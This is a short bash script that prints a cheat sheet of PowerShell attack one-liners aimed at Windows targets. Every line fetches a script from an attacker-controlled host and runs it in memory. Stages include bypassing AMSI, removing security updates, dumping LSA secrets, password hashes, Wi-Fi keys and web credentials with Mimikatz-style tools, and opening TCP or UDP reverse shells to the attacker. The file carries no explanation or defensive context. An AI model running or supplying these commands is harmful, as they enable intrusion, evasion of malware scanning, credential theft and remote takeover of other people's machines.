TargetIP=""
TargetPort=""
AttackerIP=""
AttackerPort=""

echo -e '\e[1mBypass\033[0m'
echo "iex (New-Object Net.Webclient).DownloadString(\"http://$AttackerIP/Bypass/Invoke-AmsiBypass.ps1\"); Invoke-AmsiBypass"
echo ""

echo -e '\e[1mEscalation\033[m'
echo "iex (New-Object Net.Webclient).DownloadString(\"http://$AttackerIP/Escalation/Remove-Update.ps1\"); Remove-Update All"
echo "iex (New-Object Net.Webclient).DownloadString(\"http://$AttackerIP/Escalation/Remove-Update.ps1\"); Remove-Update Security"
echo ""

echo -e '\e[1mGather\033[0m' 
echo "iex (New-Object Net.Webclient).DownloadString(\"http://$AttackerIP/Gather/Copy-VSS.ps1\"); Copy-VSS -Destination <Destination>"
echo "iex (New-Object Net.Webclient).DownloadString(\"http://$AttackerIP/Gather/Get-Information.ps1\"); Get-Information"
echo "iex (New-Object Net.Webclient).DownloadString(\"http://$AttackerIP/Gather/Get-LSASecret.ps1\"); Get-LSASecret"
echo "iex (New-Object Net.Webclient).DownloadString(\"http://$AttackerIP/Gather/Get-PassHashes.ps1\"); Get-PassHashes"
echo "iex (New-Object Net.Webclient).DownloadString(\"http://$AttackerIP/Gather/Get-PassHints.ps1\"); Get-PassHints"
echo "iex (New-Object Net.Webclient).DownloadString(\"http://$AttackerIP/Gather/Get-WLAN-Keys.ps1\"); Get-WLAN-Keys"
echo "iex (New-Object Net.Webclient).DownloadString(\"http://$AttackerIP/Gather/Get-WebCredentials.ps1\"); Get-WebCredentials"
echo "iex (New-Object Net.Webclient).DownloadString(\"http://$AttackerIP/Gather/Invoke-CredentialsPhish.ps1\"); Invoke-CredentialsPhish"
echo "iex (New-Object Net.Webclient).DownloadString(\"http://$AttackerIP/Gather/Invoke-Mimikatz.ps1\"); Invoke-Mimikatz"
echo "iex (New-Object Net.Webclient).DownloadString(\"http://$AttackerIP/Gather/Invoke-Mimikittenz.ps1\"); Invoke-Mimikittenz"
echo "iex (New-Object Net.Webclient).DownloadString(\"http://$AttackerIP/Gather/Invoke-SessionGopher.ps1\"); Invoke-SessionGopher"
echo ""

echo -e '\e[1mShells\033[0m'
echo "iex (New-Object Net.Webclient).DownloadString(\"http://$AttackerIP/Shells/Invoke-PowerShellTcp.ps1\"); Invoke-PowerShellTcp -Reverse -IPAddress $AttackerIP -Port $AttackerPort"
echo "iex (New-Object Net.Webclient).DownloadString(\"http://$AttackerIP/Shells/Invoke-PowerShellUdp.ps1\"); Invoke-PowerShellUdp -Reverse -IPAddress $AttackerIP -Port $AttackerPort"
